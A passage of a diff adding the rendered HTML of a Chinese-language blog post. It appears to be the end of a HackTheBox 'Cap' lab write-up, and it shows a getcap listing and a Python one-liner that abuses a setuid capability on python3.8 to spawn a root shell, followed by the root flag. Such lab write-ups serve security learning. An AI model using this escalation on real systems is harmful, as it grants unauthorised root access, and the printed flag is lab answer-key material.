+</span></span><span class="line"><span class="cl">/usr/bin/ping <span class="o">=</span> cap_net_raw+ep
+</span></span><span class="line"><span class="cl">/usr/bin/traceroute6.iputils <span class="o">=</span> cap_net_raw+ep
+</span></span><span class="line"><span class="cl">/usr/bin/mtr-packet <span class="o">=</span> cap_net_raw+ep
+</span></span><span class="line"><span class="cl">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span class="o">=</span> cap_net_bind_service,cap_net_admin+ep
+</span></span><span class="line"><span class="cl">nathan@cap:~$ python3.8 -c <span class="s1">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">root@cap:~# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：/usr/bin/python3.8</strong></p>
+<h3 id="submit-root-flag">Submit Root Flag
+</h3><blockquote>
+<p>Submit the flag located in root&rsquo;s home directory.</p>
+<p>提交位于 root 用户主目录中的 flag。</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@cap:~# cat /root/root.txt 
+</span></span><span class="line"><span class="cl">0553454a65e020c51dfda665755812d4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：0553454a65e020c51dfda665755812d4</strong></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/mazesec-pot/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MazeSec Pot</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/htb-starting-point-%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97/">
+        
+        
+            <div class="article-image">
+                <img src="/p/htb-starting-point-%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97/assets/image-20261104205444073.d9e4fd976e03998d17a7cc2012db183c_hu3527743922139951764.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HTB Starting Point 入门系列"
+                        
+                        data-hash="md5-2eT9l24DmY0Xp8wgEtsYPA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB Starting Point 入门系列</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/mazesec-0l023/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MazeSec 0l023</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Sp1ke
+    </section>
+    
+    <section class="powerby">
+        
+            记录安全学习 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
